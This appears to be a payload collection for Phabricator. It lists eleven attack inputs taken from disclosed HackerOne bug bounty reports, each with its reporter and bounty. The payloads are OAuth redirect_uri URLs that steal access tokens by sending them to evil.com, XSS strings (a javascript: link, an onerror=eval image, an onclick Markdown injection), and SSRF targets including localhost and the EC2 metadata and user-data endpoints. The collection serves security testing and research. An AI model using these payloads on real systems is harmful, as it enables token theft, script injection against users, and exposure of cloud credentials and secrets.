# Phabricator

11 payloads.

### `246736de`

```
https://target.com/dialog/oauth?client_id=184510521580034&response_type=token&redirect_uri=https://evil.com/phame/live/47/
```

**Parameter:** `redirect_uri`
— [OAuth access_token stealing in Phabricator](https://hackerone.com/reports/3596) · Phabricator · [krangbuster](https://hackerone.com/krangbuster) · $450.0

### `659d3ca0`

```
https://target.com/oauthserver/auth/?redirect_uri=http://evil.com&response_type=code&client_id=PHID-OASC-oyfqtnanxsukiw5lsnce&scope=ggg
```

**Parameter:** `redirect_uri`
— [OAuth Stealing Attack (New)](https://hackerone.com/reports/3930) · Phabricator · [krangbuster](https://hackerone.com/krangbuster) · $400.0

### `c42073e7`

```
https://target.com/dialog/oauth?client_id=184510521580034&response_type=token&redirect_uri=https://evil.com/oauthserver/auth/?redirect_uri=http://evil2.com%26response_type=code%26client_id=PHID-OASC-oyfqtnanxsukiw5lsnce%26scope=ggg
```

**Parameter:** `redirect_uri`
— [OAuth Stealing Attack (New)](https://hackerone.com/reports/3930) · Phabricator · [krangbuster](https://hackerone.com/krangbuster) · $400.0

### `b5b24c10`

```
javascript
:alert('xss')
```

— [Persistent XSS: Editor link](https://hackerone.com/reports/4114) · Phabricator · [tomvg](https://hackerone.com/tomvg) · $300.0

### `ba92d1a4`

```
{meme, src= http://dummy//onerror=eval(prompt(1))// }
```

— [XSS in editor by any user](https://hackerone.com/reports/18691) · Phabricator · [tunnelshade](https://hackerone.com/tunnelshade) · $1,000.0

### `b2e30906`

```
http://localhost/,
```

— [Server Side Request Forgery in macro creation](https://hackerone.com/reports/50537) · Phabricator · [haquaman](https://hackerone.com/haquaman)

### `f328a6ab`

```
http://127.0.0.1
```

— [Server Side Request Forgery in macro creation](https://hackerone.com/reports/50537) · Phabricator · [haquaman](https://hackerone.com/haquaman)

### `ff405420`

```
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/user-data
```

— [SSRF vulnerability (access to metadata server on EC2 and OpenStack)](https://hackerone.com/reports/53088) · Phabricator · [agarri_fr](https://hackerone.com/agarri_fr) · $300.0

### `ee6e5e04`

```
http://169.254.169.254/latest/meta-data/hostname
```

— [SSRF vulnerability (access to metadata server on EC2 and OpenStack)](https://hackerone.com/reports/53088) · Phabricator · [agarri_fr](https://hackerone.com/agarri_fr) · $300.0

### `abfe4c50`

```
http://169.254.169.254/latest/user-data
```

— [SSRF vulnerability (access to metadata server on EC2 and OpenStack)](https://hackerone.com/reports/53088) · Phabricator · [agarri_fr](https://hackerone.com/agarri_fr) · $300.0

### `14ef47a1`

```
[ ](http://a?p=[[/onclick=alert(0) .]])
```

**Parameter:** `p`
— [Markdown parsing issue enables insertion of malicious tags](https://hackerone.com/reports/758002) · Phabricator · [sectex](https://hackerone.com/sectex)
